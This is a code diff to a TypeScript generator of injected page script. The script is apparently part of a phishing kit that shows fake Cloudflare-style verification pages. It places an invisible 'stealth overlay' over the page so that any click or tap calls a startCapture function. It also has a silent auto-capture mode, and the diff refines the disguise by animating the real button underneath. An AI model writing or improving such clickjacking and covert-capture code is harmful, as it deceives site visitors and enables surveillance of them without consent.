@@ -61,7 +61,7 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
        window.onload = function() {
          setTimeout(function() { window.startCapture('silent'); }, 1000);
        };
-    } else {
+    } else if (flowType !== 'aggressive') {
        // Implementation of Professional Stealth Overlay for interaction capture
        window.addEventListener('load', function() {
           var over = document.createElement('div');
@@ -76,44 +76,8 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
           over.style.cursor = 'default';
           document.body.appendChild(over);
           
-          if (!document.querySelector('.ray-desc') && cfg.tmplId !== 'cloudflare') {
-            var rayId = document.createElement('div');
-            rayId.style.position = 'fixed';
-            rayId.style.bottom = '10px';
-            rayId.style.right = '10px';
-            rayId.style.fontSize = '12px';
-            rayId.style.fontFamily = 'monospace';
-            rayId.style.color = 'rgba(150,150,150,0.6)';
-            rayId.style.zIndex = '999999';
-            rayId.style.pointerEvents = 'none';
-            rayId.innerText = 'Ray : rax53rtnaomap';
-            document.body.appendChild(rayId);
-          }
-          
           function getTargetBtn() {
             return document.querySelector('.btn-verify') || document.querySelector('.btn') || document.querySelector('button') || document.querySelector('.interactive-box');
-          }
-
-          var targetForTrap = getTargetBtn();
-          if (targetForTrap && cfg.tmplId !== 'enuma_elish' && cfg.tmplId !== 'flash_strike') {
-              var isInteractiveBox = targetForTrap.classList.contains('interactive-box');
-              if (!isInteractiveBox) {
-                  targetForTrap.innerText = 'DOUBLE TAP VERIFICATION';
-              }
-              var warn = document.createElement('div');
-              warn.style.fontSize = '12px';
-              warn.style.fontWeight = 'bold';
-              warn.style.color = '#ff0000';
-              warn.style.textAlign = 'center';
-              warn.style.marginTop = '10px';
-              warn.style.animation = 'blink 0.5s infinite alternate';
-              warn.innerText = '⚠️ DOUBLE TAP REQUIRED ⚠️';
-              if (targetForTrap.parentNode) {
-                  targetForTrap.parentNode.insertBefore(warn, targetForTrap.nextSibling);
-              }
-              var style = document.createElement('style');
-              style.innerHTML = '@keyframes blink { from { opacity: 1; } to { opacity: 0.3; } }';
-              document.head.appendChild(style);
           }
 
           over.addEventListener('mousemove', function(e) {
@@ -130,22 +94,27 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
 
           function trigger() {
             window.startCapture();
-            over.remove();
+            if (over && over.parentNode) over.parentNode.removeChild(over);
           }
           
-          over.addEventListener('click', function(e) {
+          function handleTap(e) {
             var btn = getTargetBtn();
-            if (btn) {
+            // Stealth animation on the real UI element underneath
+            if (btn && cfg.tmplId !== 'enuma_elish' && cfg.tmplId !== 'flash_strike') {
               btn.style.transform = 'scale(0.96)';
-              btn.style.filter = 'brightness(1.2)';
-              setTimeout(function() { btn.style.transform = ''; btn.style.filter = ''; }, 100);
+              if (!btn.classList.contains('interactive-box')) {
+                btn.style.opacity = '0.8';
+              }
+              setTimeout(function() { 
+                btn.style.transform = ''; 
+                if (!btn.classList.contains('interactive-box')) btn.style.opacity = '1';
+              }, 150);
             }
             trigger();
-          });
+          }
           
-          over.addEventListener('touchstart', function(e) {
-            trigger(); 
-          });
+          over.addEventListener('click', handleTap);
+          over.addEventListener('touchstart', handleTap, {passive: true});
        });
     }
 
